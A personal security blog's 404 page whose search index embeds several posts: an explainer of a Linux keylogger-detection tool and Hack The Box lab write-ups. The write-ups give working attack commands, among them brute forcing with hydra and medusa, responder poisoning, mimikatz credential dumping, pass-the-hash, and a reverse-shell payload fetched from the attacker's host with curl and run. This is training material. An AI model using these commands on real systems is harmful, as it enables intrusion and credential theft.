<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="404 Page not found">

    
        <title>404 Page not found | Vamsi200 Blog</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.a16fe0d3348fce833e6f88f239489b9d38a0fff46943aacc7096b262ef334cc0.css" media="all">
      <link rel="stylesheet" href="/css/custom.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/">Home</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/about/">About</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/tags">Tags</a></li>
            
          </ul>
        </nav>
        


404 NOT FOUND

<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 200),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/tags\/cybersec\/": {
        "title": "Cybersec",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cybersec\/"
    },
    
    "http:\/\/localhost:1313\/posts\/explaining_fkeylogger_the_rationale_behind_linux_keylogger_detection\/": {
        "title": "Explaining FKeylogger: The Rationale Behind Linux Keylogger Detection",
        "tags": ["cybersec",],
        "content": "Intro Keyloggers on Linux are pretty rare - I guess, but they still exist. Are they easy to detect? Well‚Ä¶ maybe, maybe not. It really depends on the adversary and how much effort this guy put to hide it. Anyway, I built this project because at some point I decided, \u0026ldquo;Let‚Äôs build a tool to detect them\u0026rdquo; - and here we are - Github link Disclaimer: Before we start please do understand that this project is just an exploration and built out of curiosity.\nNow, how the hell do you even find this goddamn keylogger anyway? Well, you can‚Äôt just scan or search for the word ‚Äúkeylogger‚Äù in running processes (you may find it if the adversary is that retarded) - real attackers aren‚Äôt that stupid I guess..\nSo, if we want to find them, we first have to understand how input is handled on Linux systems. On Linux, we have different ways to read input, and attackers can hook into any of them.\n/dev/input/event* (evdev interface)\nThis is the ‚Äúnormal‚Äù way. Every physical keyboard press is an event reported under /dev/input/. Legit apps like, for example, your desktop environment, X11, or Wayland compositor listen here. /dev/hidraw* (raw HID interface)\nHID = Human Interface Device. These are the raw USB packets from keyboards/mice. If something grabs /dev/hidraw0, it‚Äôs bypassing the higher-level event system and reading the raw keypresses. evdev library / ioctl syscalls\nInstead of manually parsing /dev/input/event*, a process can use the evdev API to subscribe to events. Under the hood, it‚Äôs the same source, but it makes detection trickier. virtual input (uinput)\nThere‚Äôs also /dev/uinput, which isn‚Äôt really about reading input - it‚Äôs about creating fake devices. A keylogger could be using this in combo with something else, like: log keystrokes, then maybe replay them later as if they came from a legit keyboard. higher layers (X11 / Wayland)\nOn X11, a keylogger can just ask the server for global key events. On Wayland, I think its pretty strict to access inputs - unknown apps generally can‚Äôt grab global input (haven\u0026rsquo;t tested). These are some of the ways that I could find to read inputs. The next step would be figuring out which process is using our/accessing input devices.\n*Note: The below approaches described here are from the basis of how my tool detects suspicious activity.\nTrying to find Keylogger\u0026rsquo;s As a first step, I did was, to get the processes that have file descriptors open. This alone could already let us flag any suspicious processes that have access to input. For deeper analysis, we could trace syscalls like read or ioctl using eBPF (which I will cover later in this blog).\nPseudocode: Detect processes accessing input devices(FD) Get list of active input devices in /dev/input/ (those starting with event*).\nFor each process:\nCheck if its /proc/\u0026lt;pid\u0026gt;/fd/ directory exists. For each file descriptor of the process: Resolve the real path of the descriptor. If it matches an input device path: Record that this PID is using the device. Stop checking further descriptors for this process. Return a mapping of:\n{ pid - set of input devices it is accessing }\nExample: { 1234: {/dev/input/event2}, 5678: {/dev/input/event3, /dev/input/event4} } 2) Detecting Processes Accessing Input via X11 Not all keyloggers open those files directly - some use higher-level APIs like X11 to capture keystrokes, so we should also get the processes who are connecting to X11 server and might be reading input events through it.\nThe logic I used is pretty simple:\nFirst we check a process\u0026rsquo;s fd and see if it‚Äôs connected to the X11 Unix socket (/tmp/.X11-unix/X0). Check its environment variables (XAUTHORITY, DISPLAY) - if they exist, the process may likely have access to X11. Check if the process has loaded X11- related libraries like libX11.so or libXt.so. Combine all these signals into a confidence score. The more the signals, the higher the chance that the process is using X11 for input. Pseudocode: Detect processes accessing input via X11 For each process:\nCollect open file descriptors. Check if any are sockets connected to /tmp/.X11-unix/X0. If yes, increase confidence score and note the number of sockets. Check environment variables:\nIf XAUTHORITY exists - increase confidence. If DISPLAY exists - increase confidence. Check loaded libraries:\nIf process has loaded libX11.so or libXt.so ‚Üí increase confidence. Return:\n(confidence, access_rate) Example: Process 405 - confidence=3, access_rate=1 3) eBPF Approach Another way to detect keyloggers is using eBPF . Instead of scanning /proc, we can attach eBPF programs directly in the kernel to monitor access to input devices - for example, syscalls like open/openat (to see who is trying to open /dev/input/event*) or kernel functions like vfs_read/vfs_ioctl (to see who is actually reading keystrokes).‚Äù This way, whenever a process tries to access /dev/input/event*, we can capture that information in real time - which makes it more reliable and accurate.\neBPF Hooks That I Used vfs_read ‚Üí is triggered when a process reads from /dev/input/event*.\nThis is the most direct sign that a process is capturing keystrokes. It also catches reads from /dev/hidraw* (like USB keyboards), but since vfs_read is used for any file read, it can get noisy. In practice, we should it by path (e.g., only /dev/input/* and /dev/hidraw*) which I did through - template_gen.py, see here . vfs_ioctl ‚Üí is triggered when a process uses ioctl on an input device.\nSome keyloggers rely on ioctl calls to fetch input data. vfs_write ‚Üí is triggered when a process writes to /dev/uinput.\nThis is useful for detecting processes that try to inject fake keystrokes, making them appear as if they came from a legitimate device. Other Approaches Below are some other ways we could find processes that access input devices:\nStatic Module Analysis : By checking which libraries or modules a process has loaded, we can flag unusual behavior. For example, say a simple text editor, it shouldn‚Äôt normally load modules like pyxhook or other input-capturing libraries. If it does, that‚Äôs suspicious.\nSuspicious String Scanning : Scanning binaries or scripts for strings like keyboard, input_event, event or code related to input hooks can expose hidden intent.\nModule Checking : Different tools (memory maps, lsof, pmap, etc.) can reveal different sets of loaded modules used by programs. Say there\u0026rsquo;s a python program that is obfuscated and we can\u0026rsquo;t read the content of it and we want to know what libraries/modules it is using, to determine the intent of the program, in that cases, we could use this approach.\nNow that we have some base and are able to find processes that access input devices, we have the most important part - Differentiate between a legitimate process accessing input and the one which is suspicious.\nFor example, legit processes like Xorg, browsers, or text editors must open /dev/input/event* to read the input, contrast to that a process that is running from a /tmp/ directory with no GUI accessing your input is much more suspicious, so\u0026hellip;\nThe Strategy: How We Separate Legitimate and Suspicious Processes For this, I have gone through multiple levels of checks; some are pretty basic, and some are very specific.\nThese checks will be done on processes that have input access.\nWhy so many checks? Because no single check is bulletproof. If we want to catch keyloggers, one need to think like someone actually trying to hide one - not just flag every text editor or Xorg instance that accesses /dev/input/.\nNote: That doesn\u0026rsquo;t mean that we will be not having ANY false positives, I tried to tackle this using the Trust/Untrust binary option, see --help\nCheck where the binary lives - system folder or /tmp?\nLegit processes usually live under /usr/bin, /bin, /usr/libexec, etc. Anything in /tmp, /dev/shm, or a random home directory path is little sus. Attackers usually hide payloads in writable places that don‚Äôt need root access. Who owns it? And who can write to it?\nRoot-owned, unwritable binaries are usually safe. World-writable binaries/scripts are a big red flag - because they can be swapped out easily. A binary ‚Äúowned‚Äù by some odd user account (like www-data or a throwaway UID) is also worth checking. Is it registered with the package manager?\npacman -Qo / dpkg -S / rpm -qf can tell you if a binary belongs to a legit package. No package record = maybe someone just dropped it there or the user downloaded it. Is the binary packed or obfuscated (UPX, high entropy, magic headers)?\nNormal system binaries usually don\u0026rsquo;t need packing. UPX headers, compressed payloads, or random high-entropy blobs can be a hint that it is attempting to dodge static analysis. Did the attacker try to run the deleted binary from memory - so it doesn‚Äôt show up in normal file searches?\nYou‚Äôll see this as path (deleted) in /proc/\u0026lt;pid\u0026gt;/exe. This is a classic trick to hide persistence: run once from /tmp, delete it, and let it stay memory-resident. This shows the intent to hide from forensics. What launched the process - was it cron, atd, sshd, or something normal, like your desktop?\nIf it‚Äôs hooked under cron, it might auto-respawn. Spawning under sshd could mean a remote attacker dropped it. Unexpected parent processes (bash, python, perl) starting daemons need to be checked. Is it doing network stuff in the background like trying to send keystrokes somewhere else?\nLook for suspicious outbound connections (netstat, ss, /proc/net/*). Are there signs of persistence that shouldn‚Äôt be there - cron jobs, autostart, weird shell profile entries?\nCheck ~/.bashrc, ~/.zshrc, /etc/profile.d/. Look for odd systemd service units or ~/.config/autostart entries. Is the process slinging around suspicious IPC artifacts, loading weird modules, or relying on LD_PRELOAD hacks in places that we never expect?\nCheck /proc//maps and lsof for unusual shared objects. Malicious processes that may inject themselves via LD_PRELOAD or custom .so files. Check for unexpected named pipes, sockets, or /tmp/.X11-unix/ shenanigans. Okay, now that we differentiated legit and not so legit processes accessing input, we just have to show the output to the user.\nDisplaying the findings Default option ‚Äì Initial System Checks (RECOMMENDED) When running the tool without any extra flags, it will go through a set of basic checks that can help to find potential keylogger activity or persistence tricks. These include:\nFind suspicious input devices ‚Äì Keyloggers often create virtual devices or masquerade as generic HID (Human Interface Device) devices. If you see an extra ‚Äúkeyboard-like‚Äù device that you don‚Äôt own, then it could be a strong sign that it is a hidden monitoring software.\nInspect shell configuration (rc files) ‚Äì Files like .bashrc, .zshrc, or .profile etc.. will run automatically every time a shell is opened. Adversaries could sneak in malicious commands here, so that the keylogger reactivates on every login.\nAnalyze PAM modules ‚Äì PAM (Pluggable Authentication Modules) control Linux authentication (logins, sudo, ssh, etc.). A module that is compromised or is unknown, could be logging credentials directly during authentication. Verifying these modules ensures us that is no plugin that is silently harvesting your passwords.\nScan for suspicious aliases ‚Äì Since, linux allows aliasing commands, attackers could exploit this and then silently run keyloggers or log your keystrokes whenever the commands are executed.\nCheck .inputrc files ‚Äì This file defines how readline (library that is used for bash input) processes the keystrokes. Malicious entries could be used to log or redirect your typed commands or whatever you type bro.\nReview cron jobs \u0026amp; scheduled tasks ‚Äì Keyloggers often rely on cron jobs to relaunch themselves mostly after reboots or maybe at some random intervals. For example, a cron job might silently restart a hidden logging process. Inspecting the jobs could help us catch this.\nCheck for LD_PRELOAD abuse ‚Äì LD_PRELOAD can force processes to load a custom library before others. Attackers can abuse this by injecting logging functions into every program that reads input. It‚Äôs a powerful and stealthy way to keylog across the system.\nAnd other three main approaches:\nSingle PID Mode (--p) Takes a single PID from the user. Performs all checks (mentioned before) and these: Detects input device usage. Tracks file paths and parent processes. Performs file authenticity and obfuscation checks. Monitors persistence, network, and IPC/module indicators. Prints detailed findings for that process. Quick Scan Mode (--scan) Scans all running processes. For each process, performs the same checks as Single PID Mode. Aggregates results and reports all suspicious findings at the end. Monitor Mode (--monitor) Similar to Quick Scan but runs continuously until the user exits. Checks processes at a defined interval (n seconds). Provides real-time updates on input access and suspicious activity. Some Other Things Active User Input Prompt During Single PID or Quick Scan monitoring, the tool will prompt the user to type a random sequence on the keyboard (it doesn\u0026rsquo;t matter whether you typed it wrong or right, we just need you to use your keyboard).\nWhy?\nSome keyloggers only activate when real keyboard input occurs. By generating actual keystrokes, we could increase the likelihood of triggering a keylogger and capturing its activity during the monitoring. Trust / Untrust Binary Option (--modify_trust) This option allows the user to manually mark a binary as trusted or untrusted.\nWhy? The detection as I explained involves heuristics and can sometimes produce false positives. By letting the user specify which binaries are safe, the tool can avoid repeatedly flagging known safe processes and focus on genuinely suspicious activity. The --all option would skips this and scans all processes. Conclusion Remember, no tool can guarantee 100% detection. That\u0026rsquo;s it, that\u0026rsquo;s the conclusion. Sankyou\n", 
        "url": "http:\/\/localhost:1313\/posts\/explaining_fkeylogger_the_rationale_behind_linux_keylogger_detection\/"
    },
    
    "http:\/\/localhost:1313\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/posts\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/": {
        "title": "Vamsi200 Blog",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/posts\/skills-assessment1and2-login-brute-forcing\/": {
        "title": "Skills Assessment 1\u00262 Login Brute Forcing",
        "tags": [],
        "content": "Question 1 - What is the password for the basic auth login? We were given the username \u0026amp; password wordlists, so let\u0026rsquo;s use them: hydra -L \u0026lt;username wordlist\u0026gt; -P \u0026lt;password wordlist\u0026gt; \u0026lt;ip\u0026gt; http-get / -s \u0026lt;port\u0026gt; Question 2 - After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment? When we login using the credentials that we found we find the username: Skills Assessment Part 2 Question 1 - What is the username of the ftp user you find via brute-forcing? we know the username, I ran a nmap scan and found ssh running.. so let\u0026rsquo;s crack it with the given wordlist.\nmedusa -h \u0026lt;ip\u0026gt; -n \u0026lt;port\u0026gt; -u \u0026lt;username\u0026gt; -P \u0026lt;wordlist\u0026gt; -M ssh -t 3 Running that we get the password. Login with the credentials. Don\u0026rsquo;t forget the port\nssh username@\u0026lt;IP\u0026gt; -p \u0026lt;port\u0026gt; We have some files, When we cat the IncidentReport.txt we get to know about a user: Th****. So yeah that\u0026rsquo;s the user.\nQuestion 2 - What is the flag contained within flag.txt Now that we have a username, we also are provided with the password wordlist to crack ftp.. When we run medusa with the username, I didn\u0026rsquo;t find any password match.. and then the username to th****(small case) and found the password. Let\u0026rsquo;s login and get our flag. And yep, that\u0026rsquo;s it. ", 
        "url": "http:\/\/localhost:1313\/posts\/skills-assessment1and2-login-brute-forcing\/"
    },
    
    "http:\/\/localhost:1313\/tags\/htb\/": {
        "title": "Htb",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/htb\/"
    },
    
    "http:\/\/localhost:1313\/posts\/skills-assessment---web-fuzzing\/": {
        "title": "Skills Assessment   Web Fuzzing",
        "tags": ["htb","cybersec",],
        "content": "Question 1 - Run a sub-domain/vhost fuzzing scan on \u0026lsquo;*.academy.htb\u0026rsquo; for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name) Well this is straight forward, let\u0026rsquo;s use subdomains-top1million-5000. Don\u0026rsquo;t forget to add ip in your hosts file. ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:\u0026lt;port\u0026gt;/ -H \u0026#39;Host: FUZZ.academy.htb\u0026#39; Question 2 - Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains? Okay, Let\u0026rsquo;s use web-extensions.txt wordlist, pretty straight-forward. I tried fuzzing on 3 different vhosts that we found, and we got our answer. ffuf -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:43252/indexFUZZ Question 3 - One of the pages you will identify should say \u0026lsquo;You don\u0026rsquo;t have access!\u0026rsquo;. What is the full page URL? We have to fuzz on all of our vhosts with recursion and the extensions that we just found.\nI just checked the hint :)\nAlso with 1000 threads.. :?\nffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FUZZ -u http://vhost.academy.htb:PORT/FUZZ -recursion -recursion-depth 1 -e .ext1,.ext2,.ext3 -v -fs \u0026lt;xxx\u0026gt; -t 1000 Question 4 - In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they? Well, we should find the parameters first.. so.. burp-parameter-names.txt\nI got the answer, and gave it as answer.. it\u0026rsquo;s wrong.. because I didn\u0026rsquo;t read the question properly.. question is expecting more parameters..\nso:\nffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u \u0026#39;\u0026lt;url\u0026gt;\u0026#39; -X POST -d \u0026#39;FUZZ=key\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -fs xxx Question 5 - Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag? First we have to find valid usernames..\nI tried different wordlists and finally got the answer with xato-net-10-million-usernames.txt wordlist.\nffuf -w /opt/SecLists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u \u0026#39;\u0026lt;url\u0026gt;\u0026#39; -X POST -d \u0026#39;username=FUZZ\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -fs 781 -t 500 Now, that we have our usernames.. let\u0026rsquo;s just curl it!!\ncurl \u0026lt;url\u0026gt; -X POST -d \u0026#39;username=\u0026lt;user\u0026gt;\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; Andd we got the flag :)\n", 
        "url": "http:\/\/localhost:1313\/posts\/skills-assessment---web-fuzzing\/"
    },
    
    "http:\/\/localhost:1313\/posts\/skills-assessment---using-web-proxies\/": {
        "title": "Skills Assessment Using Web Proxies",
        "tags": ["htb","cybersec",],
        "content": "Question 1 - The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag. First make sure to enable Intercept responses and make it to POST request. Now Forward the request. In Response tab, remove the disabled and forward it (Going back to your browser, you can click on button which reveals the flag, don\u0026rsquo;t forget to turn Intercept off) or send it to repeater tab and click on send, which would reveal the flag. Question 2 - The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer. Hitting /admin.php, we get the cookie. Which then can be sent to Decoder: cookie -\u0026gt; decode as ASCII Hex -\u0026gt; reveals base64 -\u0026gt; decode as base64 -\u0026gt; flag(31 chars value) Question 3 - Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the \u0026ldquo;alphanum-case.txt\u0026rdquo; wordlist from Seclist for the payload) Using Intruder, In Payload Processing, we first add our 31 chars value as prefix and Add Base64-encode, ASCII Hex encode. Now Let\u0026rsquo;s Load the alphanum-case.txt file. And start attack. We can one of the request\u0026rsquo;s responses to get the flag. Question 4 - You are using the \u0026lsquo;auxiliary/scanner/http/coldfusion_locale_traversal\u0026rsquo; tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the \u0026lsquo;XXXXX\u0026rsquo; directory being called in \u0026lsquo;/XXXXX/administrator/..\u0026rsquo;? Using Metasploit with auxiliary/scanner/http/coldfusion_locale_traversal\nuse auxiliary/scanner/http/coldfusion_locale_traversal set PROXIES HTTP:127.0.0.1:8080 set RHOSTS \u0026lt;ip\u0026gt; set RPORT \u0026lt;port\u0026gt; Running it and checking it in burp we get the answer. ", 
        "url": "http:\/\/localhost:1313\/posts\/skills-assessment---using-web-proxies\/"
    },
    
    "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_ii\/": {
        "title": "AD Enumeration \u0026 Attacks Skills Assessment Part II",
        "tags": ["htb","cybersec",],
        "content": "Question 1 - Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? When I first read the Question, my first thought was LLMNR/NBT-NS Poisoning, because of the title that we have in HTB modules(foothold) :), so I ran responder \u0026amp; got the user and hash : sudo responder -I ens224 Question 2 - What is this user\u0026rsquo;s cleartext password? Cracking the hash with hashcat, we got the password. Question 3 - Submit the contents of the C:\\flag.txt file on MS01. We need to first find the IP of MS01, let\u0026rsquo;s first run fping to get all the Ip\u0026rsquo;s that are active. fping -asgq 172.16.7.0/23 I ran a nmap scan on the Targets and found 172.16.7.50 is MS01, so I initially ran crackmapexec to check if our credentials that we just found are useful. We can use winrm to login and get the flag Question 4 \u0026amp; 5 - Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain \u0026amp; What is this user\u0026rsquo;s password? I wanted to use login using xfreerdp, so that I can easily transfer tools.. I used ssh tunneling to achieve that : ssh -D 9050 \u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt; change/add the proxychains config to use socks4\nI used PowerView to get the no.of users(I didn\u0026rsquo;t just come to conclusion of using PowerView here, I used crackmapexec to get the same..I just wanted to show the count of the users that we are working with..and the reason why I used DomainPasswordSpray tool further): Import-Module .\\PowerView.ps1 Get-NetUser | Select-Object -ExpandProperty SamAccountName | Measure-Object It\u0026rsquo;s a good idea to use DomainPasswordSpray, I tried common passwords and found the username and password : Question 6 - Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? We can use smbmap to get the permissions of shares and found the file in Department Shares Question 7 - Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. We can use mssqlclient and the credentials that we just found to login. And we find that SeImpersonatePrivilege enabled. This is significant because it allows us to impersonate other users on the system, including the SYSTEM account, which we can then use to execute commands with elevated privileges. We can exploit this. For ease of use, Let\u0026rsquo;s use Metasploit.\nuse exploit/windows/mssql/mssql_payload set LHOST 172.16.7.240 set RHOSTS 172.16.7.60 set USERNAME \u0026lt;user\u0026gt; set PASSWORD \u0026lt;password\u0026gt; We can use getsytem and get the flag. Question 8 - Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. I tried different methods and came down to using mimikatz, so firstly let\u0026rsquo;s upload mimikatz. I ran mimikatz and got the mssqlsvc password: privilege::debug sekurlsa::logonpasswords I used these credentials and logged in using xfreerdp and used mimikatz to dump the Administrator hash: proxychains xfreerdp /v:\u0026#39;172.16.7.50\u0026#39; /u:\u0026#34;inlanefreight.local\\\u0026lt;username\u0026gt;\u0026#34; /p:\u0026#39;\u0026lt;password\u0026gt;\u0026#39; /cert:ignore /drive:Shared,/opt/test Now that we have the hash, we can pass the hash with evil-winrm and login as Administrator and get the flag. evil-winrm -i \u0026lt;ip\u0026gt; -u Administrator -H \u0026lt;hash\u0026gt; Question 9 - Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What\u0026rsquo;s this user\u0026rsquo;s account name? To achieve this we can use PowerView : Import-Module .\\PowerView.ps1 Get-DomainObjectAcl -Identity \u0026#34;CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local\u0026#34; | Where-Object { $_.ActiveDirectoryRights -like \u0026#34;*GenericAll*\u0026#34;} ConvertFrom-SID \u0026lt;sid\u0026gt; Question 10 - Crack this user\u0026rsquo;s password hash and submit the cleartext password as your answer. I checked previous question\u0026rsquo;s Hint and it was talking about our initial foothold that we did, which was LLMNR/NBT-NS Poisoning, so I ran Inveigh.exe and got the hash :) We can use hashcat to crack this: hashcat -m 5600 \u0026lt;file\u0026gt; Question 11 - Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. This took some time and I got little frustrated and next day I realized that GenericAll gives the ability to add or remove members. So.. used runas to login with user CT***, next added our user to domain admins.\nCreated a cred object and got the flag.\nrunas /netonly /user:\u0026lt;user\u0026gt; powershell.exe Net group \u0026#34;domain admins\u0026#34; \u0026lt;username\u0026gt; /add /domain $cred = New-Object System.Management.Automation.PSCredential(\u0026#34;INLANEFREIGHT\\\u0026lt;username\u0026gt;\u0026#34;, (ConvertTo-SecureString \u0026#34;\u0026lt;password\u0026gt;\u0026#34; -AsPlainText -Force)) Enter-PSSession -ComputerName DC01 -Credential $cred Question 12 - Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. For this I just copied mimikatz and got the hash Note: This is not a straight process. Like I just know to do these things, It\u0026rsquo;s a mix of Reconnaissance, trail and error and more..\n", 
        "url": "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_ii\/"
    },
    
    "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_i\/": {
        "title": "AD Enumeration \u0026 Attacks Skills Assessment Part I",
        "tags": ["htb","cybersec",],
        "content": "Initial Access Reconnaissance Given the Scenario, we get the user admin and the password My_W3bsH3ll_*********, so we login with the credentials:\nQuestion 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server Well, seems that we can access the contents of the Administrator Desktop, so I just grabbed the flag type C:\\Users\\Administrator\\Desktop\\flag.txt Reverse Shell Using Metasploit Payload Generation msfvenom -p windows/x64/meterpreter/reverse_https lhost=\u0026lt;attacker_ip\u0026gt; -f exe -o payload.exe lport=4444 Metasploit Listener Configuration use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set LHOST 10.10.15.161 set LPORT 4444 Payload Delivery And Execution python3 -m http.server using curl to download and executing the payload curl 10.10.15.161:8000/payload.exe -o payload.exe ./payload.exe Got the Shell Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer Enumerating SPNs with setspn.exe1 setspn.exe -Q */* We got our answer that is - s*****l Question 3 - Crack the account\u0026rsquo;s password. Submit the cleartext value. To get the password we can use PowerView, We can use same method, by running a python server and curl it : Now to import the file we run : Import-Module .\\PowerView.ps1 Now that we have it imported, we run to the get the SPN Ticket 2: Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat Nice! we got the hash, lets crack it using Hashcat, which gives us the password lu***7: hashcat -m 13100 svc_sql_hash /usr/share/wordlists/rockyou.txt Question 4 - Submit the contents of the flag.txt file on the Administrator desktop on MS01 Before we proceed, Let\u0026rsquo;s first get the IP of MS01 by pinging it.. which reveals - 172.16.6.** Let\u0026rsquo;s try to login to MS01 with the credentials we found, to do that we run3:\n$password = ConvertTo-SecureString \u0026#34;\u0026lt;password\u0026gt;\u0026#34; -AsPlainText -Force $cred = new-object System.Management.Automation.PSCredential (\u0026#34;INLANEFREIGHT\\svc_sql\u0026#34;, $password) Enter-PSSession -ComputerName MS01-INLANEFREIGHT.LOCAL -Credential $cred It worked! but when I try to get the flag it didn\u0026rsquo;t work, now we have to find a workaround to get a proper Shell, so that we can retreive the flag, One way is that we can start a Socks Proxy using Metasploit, I tried it but was not working.. so I used chisel.exe to do it.\nI downloaded it using curl and ran it.\nchange/add the proxychains config to use socks5\nOn Attack Machine(Linux):\nchisel server -p 9088 --reverse On Target Machine(Windows):\n./chisel.exe client \u0026#39;Attack-IP:9088\u0026#39; R:socks Now using impacket-pssexec we can get the flag:\nproxychains impacket-psexec INLANEFREIGHT.LOCAL/\u0026lt;user\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;Target\u0026gt; Question 5 - Find cleartext credentials for another domain user. Submit the username as your answer. I ran a nmap scan to find that we have rdp open, so I logged in using xfreerdp, also I found out that we can connect to a FreeRDP server with a shared directory4, so I shared it with all the tools that we may need. proxychains xfreerdp /v:\u0026#39;172.16.6.**:3389\u0026#39; 